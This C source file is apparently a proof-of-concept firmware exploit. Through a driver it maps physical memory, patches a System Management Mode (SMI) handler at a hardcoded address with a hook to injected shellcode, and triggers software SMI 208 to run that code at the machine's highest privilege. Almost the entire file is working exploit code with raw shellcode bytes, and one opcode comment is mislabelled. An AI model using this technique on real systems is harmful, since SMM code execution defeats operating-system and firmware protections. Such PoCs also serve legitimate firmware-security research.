#include "global.h"
#include "pci.h"
#include "common_chipset.h"
#include "Util.h"
#include "physmem.h"
#include "msr.h"
#include "smi.h"



void proof_of_concept()
{
    NTSTATUS status;
    SW_SMI_CALL smi_call = { 0 };
    char* ShellcodePage = NULL;

    UINT32 HookAddr = 0xAE965438;
    UINT32 HookLen = 10;
    const char* Hook = "\x48\xC7\xC0\x00\x10\x00\x00"     // mov  rax,0x1000
                  "\xFF\xD0"                        // call rax
                  "\xC3";                           // ret

    UINT32 ShellcodeAddr = 0x1000;
    UINT32 PlaceholderAddr = ShellcodeAddr + 0x20;

    char* ShellcodePageBak = (char *) malloc(PAGE_SIZE);
    char* HookPageBak = (char *) malloc(PAGE_SIZE);


    // UINT32 ShellcodeLen = 13;
    // char* Shellcode = "\x48\xC7\xC0\x20\x10\x00\x00"        // mov  rax, #PlaceholderAddr
    //                    "\xFE\x00"                           // inc  byte ptr [rax]
    //                    "\x48\x31\xC0"                       // xor  rax, rax
    //                    "\xC3";                              // ret

    // UINT32 ShellcodeLen = 16;
    // char* Shellcode = "\x48\xC7\xC1\x20\x10\x00\x00"        // mov  rcx, #PlaceholderAddr
    //                    "\x48\x89\x01"                       // mov [rcx], rax
    //                    "\x48\x31\xC0"                       // xor  rax, rax
    //                    "\xC3";                              // ret

    UINT32 ShellcodeLen = 22;
    const char* Shellcode = "\x48\xC7\xC1\x20\x10\x00\x00"        // mov  rcx, #PlaceholderAddr
                       "\x48\x31\xC0"                       // xor  rax, rax
                       "\x8C\xC8"                           // mov eax, cs
                       "\x83\xE0\x03"                       // mov eax, 0x3
                       "\x48\x89\x01"                       // mov [rcx], rax
                       "\x48\x31\xC0"                       // xor  rax, rax
                       "\xC3";                              // ret

    printf("Shellcode address is %lx (%d bytes)\n", ShellcodeAddr, ShellcodeLen);
    printf("Hook address is %lx (%d bytes)\n", HookAddr, HookLen);
    getchar();

    // Backup page with SMI handler that will be hooked
    char* HookPage = (char *) map_physical_memory(HookAddr & 0xFFFFF000, PAGE_SIZE);
    if (!HookPage) {
        printf("Failed to allocate user physical mem\n");
        goto exit;
    }
    memcpy(HookPageBak, HookPage, PAGE_SIZE);

    // Backup page where the shellcode will be written
    ShellcodePage = (char *) map_physical_memory(ShellcodeAddr & 0xFFFFF000, PAGE_SIZE);
    if (!ShellcodePage) {
        printf("Failed to allocate user physical mem\n");
        goto exit;
    }
    memcpy(ShellcodePageBak, ShellcodePage, PAGE_SIZE);

    // Write the shellcode
    memcpy(ShellcodePage + (ShellcodeAddr & 0xFFF), (char *)Shellcode, ShellcodeLen);
    memset(ShellcodePage + (PlaceholderAddr & 0xFFF), 0x69, 1);

    // Write the SMI handler
    memcpy(HookPage + (HookAddr & 0xFFF), (char *)Hook, HookLen);

    printf("Read value before %d\n", *(ShellcodePage + (PlaceholderAddr & 0xFFF)));

    printf("Sending SMI\n");
    getchar();

    smi_call.SwSmiNumber =  208;

    trigger_smi(&smi_call);

    printf("Read value after %d", *(ShellcodePage + (PlaceholderAddr & 0xFFF)));
    getchar();

    // Restore hooked SMI handler
    memcpy(HookPage, HookPageBak, PAGE_SIZE);

    // Restore the shellcode page
    memcpy(ShellcodePage, ShellcodePageBak, PAGE_SIZE);

exit:
    return;
}


int main(int argc, char **argv)
{   

    open_platbox_device();
    proof_of_concept();
    close_platbox_device();

    return 0;
}